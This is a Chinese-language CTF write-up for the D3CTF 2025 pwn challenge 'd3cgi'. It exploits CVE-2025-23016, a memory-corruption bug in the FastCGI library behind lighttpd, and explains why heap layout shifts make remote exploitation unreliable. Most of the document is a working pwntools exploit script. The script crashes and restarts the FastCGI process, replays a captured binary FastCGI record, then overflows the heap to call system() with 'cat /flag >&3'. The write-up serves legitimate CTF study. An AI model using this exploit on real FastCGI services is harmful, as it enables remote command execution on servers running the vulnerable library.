# d3cgi

## 题目简述

归档仓库：https://github.com/yikesoftware/d3ctf-2025-pwn-d3cgi

题面提示是 FastCGI 的一个简单 1-day 漏洞：CVE-2025-23016。

修复提交：b0eabcaf4d4f371514891a52115c746815c2ff15

参考博客：cve-2025-23016-exploiter-la-bibliotheque-fastcgi

外链关键信息如下：题目仓库提供了可复现的 FastCGI / lighttpd 环境和利用样例；CVE-2025-23016 对应 FastCGI 请求处理中的内存破坏问题；补丁提交用于定位漏洞修复点；博客则解释了 FastCGI record 解析、堆布局控制和溢出利用的根因。读本题 WP 时只需要抓住一点：利用不是普通 HTTP 层漏洞，而是构造 FastCGI 二进制 record 触发 FastCGI 进程内存破坏。

## 解题过程

这里不重复展开堆风水过程和漏洞根因分析，关键背景已在上面的博客中说明：FastCGI record 的解析逻辑可以被特制长度字段扰乱，从而影响堆对象布局并触发内存破坏。

很多选手会以为自己遇到了远程环境和本地 Docker 环境行为不一致的问题，但实际原因不是环境差异，而是题目刻意考察利用稳定性。下面两种情况都可能导致本地可用的 exploit 在远程失败：

1. 远程环境被其他连接干扰，导致内存布局变化；

2. 使用 cURL 等工具分别请求远程和本地环境时，部分请求头（例如 `Host`）长度不同，进而影响转换后的 FastCGI record 长度和堆布局；

针对这些问题，可以对 PoC 做如下改进：

1. 先发送会触发缓冲区溢出的请求，使 lighttpd 预启动的 FastCGI 进程崩溃并重启，从而重置内存布局；

2. 不直接使用 cURL 发起最终请求，而是抓取已经转换成 FastCGI 格式后的二进制请求并重放。

利用脚本如下：

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
context.log_level = "debug"
context.arch = "i386"
def start(argv=[], *a, **kw):
    return remote("127.0.0.1", 9999)
    #return remote("35.220.136.70", 30777)
"""typedef struct {unsigned char version;unsigned char type;unsigned char requestIdB1;unsigned char requestIdB0;unsigned char contentLengthB1;unsigned char contentLengthB0;unsigned char paddingLength;unsigned char reserved;} FCGI_Header;"""
def makeHeader(type, requestId, contentLength, paddingLength):
    header = p8(1) + p8(type) + p16(requestId) + p16(contentLength)[::-1] + p8(paddingLength) + p8(0)
    return header
"""typedef struct {unsigned char roleB1;unsigned char roleB0;unsigned char flags;unsigned char reserved[5];} FCGI_BeginRequestBody;"""
def makeBeginReqBody(role, flags):
    return p16(role)[::-1] + p8(flags) + b"\x00" * 5
# 触发崩溃并重启守护进程
io = start()
io.send(makeHeader(1, 1, 8, 0) + makeBeginReqBody(1, 0) + makeHeader(9, 0, 900, 0) + (p8(0x13) + p8(0x13) + b"b" * 0x26)*1 + p32(0xffffffff) + p32(0xffffffff) + p32(0xdeadbeef)*0x30)
io.close()
pause(3) # 等待重启
# curl http://127.0.0.1:9999/ => FastCGI 格式
io = start()
io.send(b'\x01\x01\x00\x01\x00\x08\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x01\x04\x00\x01\x01\x9b\x00\x00\x0e\x01CONTENT_LENGTH0\x0c\x00QUERY_STRING\x0b\x01REQUEST_URI/\x0f\x03REDIRECT_STATUS200\x0b\x01SCRIPT_NAME/\x0f\x05SCRIPT_FILENAME/www/\r\x04DOCUMENT_ROOT/www\x0e\x03REQUEST_METHODGET\x0f\x08SERVER_PROTOCOLHTTP/1.1\x0f\x0fSERVER_SOFTWARElighttpd/1.4.79\x11\x07GATEWAY_INTERFACECGI/1.1\x0e\x04REQUEST_SCHEMEhttp\x0b\x04SERVER_PORT8888\x0b\tSERVER_ADDR127.0.0.1\x0b\tSERVER_NAME127.0.0.1\x0b\tREMOTE_ADDR127.0.0.1\x0b\x05REMOTE_PORT36190\t\x0eHTTP_HOST127.0.0.1:8888\x0f\nHTTP_USER_AGENTcurl/8.5.0\x0b\x03HTTP_ACCEPT*/*\x01\x04\x00\x01\x00\x00\x00\x00\x01\x05\x00\x01\x00\x00\x00\x00')
io.close()
# 利用漏洞并读取 '/flag'
io = start()
system_plt = 0x80490c0
io.send(makeHeader(1, 1, 8, 0) + makeBeginReqBody(1, 0) + makeHeader(9, 0, 900, 0) + (p8(0x13) + p8(0x13) + b"b" * 0x26)*1 + ((p8(0) * 2) * 1) + p32(0xffffffff) + p32(0xffffffff) + p32(0xdeadbeef)*12  + b"aaa; cat /flag >&3".ljust(4*5, b"\x00")
+p32(0) * 3 + p32(system_plt) + p32(0xdeadbeef) )
io.interactive()
```

## 方法总结

- 核心技巧：直接重放 FastCGI 二进制记录，而不是通过 cURL 让 HTTP 请求头长度和转换过程干扰堆布局；先崩溃并重启预启动 FastCGI 进程以重置内存布局。
- 识别信号：HTTP 服务后面有 FastCGI/lighttpd，且漏洞位于 FastCGI 解析库时，应把输入转换成 FastCGI 二进制协议层面分析。
- 复用要点：远程失败不一定是环境不同，可能是其他连接或请求头长度改变了堆布局；稳定利用时应固定请求格式并控制服务进程状态。
